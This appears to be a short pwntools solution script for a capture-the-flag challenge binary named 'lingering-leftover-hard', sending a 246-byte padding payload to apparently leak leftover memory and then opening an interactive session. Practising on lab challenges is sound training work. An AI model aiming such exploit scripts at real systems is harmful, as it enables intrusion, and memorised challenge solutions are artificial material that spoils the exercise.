from pwn import *

context.arch = "amd64"
context.log_level = "info"

# zero bytes
p = process("/challenge/lingering-leftover-hard")
p.sendline(b"246")
p.send(b"A" * 246)

p.interactive()
